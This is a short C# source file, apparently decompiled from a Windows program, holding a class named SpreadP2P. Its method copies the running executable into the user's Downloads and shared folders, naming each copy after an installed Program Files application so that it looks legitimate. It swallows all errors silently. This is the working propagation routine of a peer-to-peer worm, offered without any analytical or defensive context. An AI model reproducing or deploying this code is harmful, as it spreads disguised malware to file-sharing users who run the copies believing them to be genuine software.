using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication35;

public class SpreadP2P
{
	public string me;

	public SpreadP2P()
	{
		me = Convert.ToString(Process.GetCurrentProcess().MainModule!.FileName);
	}

	public void p2p()
	{
		try
		{
			ArrayList arrayList = new ArrayList();
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Downloads");
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\My Shared Folder");
			arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Shared");
			IEnumerator enumerator = arrayList.GetEnumerator();
			while (enumerator.MoveNext())
			{
				string text = Convert.ToString(RuntimeHelpers.GetObjectValue(enumerator.Current));
				if (Directory.Exists(text))
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
					string[] directories = Directory.GetDirectories(folderPath);
					foreach (string text2 in directories)
					{
						string destFileName = text + "\\" + text2.Substring(text2.LastIndexOf("\\")).Replace("\\", string.Empty) + ".exe";
						File.Copy(me, destFileName, overwrite: true);
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
